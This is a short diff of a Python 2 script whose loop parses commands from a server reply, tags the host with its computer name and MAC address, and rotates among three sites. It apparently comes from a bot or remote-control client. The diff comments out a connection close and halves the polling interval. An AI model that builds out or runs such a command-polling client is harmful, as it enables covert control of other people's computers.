@@ -233,7 +233,7 @@ def myloop():
                             scmd = sresponse[ifind+4:sresponse.find('||',ifind)]
                             print skill
                         
-                httpServ.close()
+                #httpServ.close()
                 if sexec == '1':
                         sCOMPUTERNAME=os.getenv('COMPUTERNAME')+"_"+smacaddress
                         try:
@@ -345,5 +345,5 @@ def myloop():
                     site=site3
                 elif site == site3:
                     site=site1
-        time.sleep(10)
+        time.sleep(5)
 
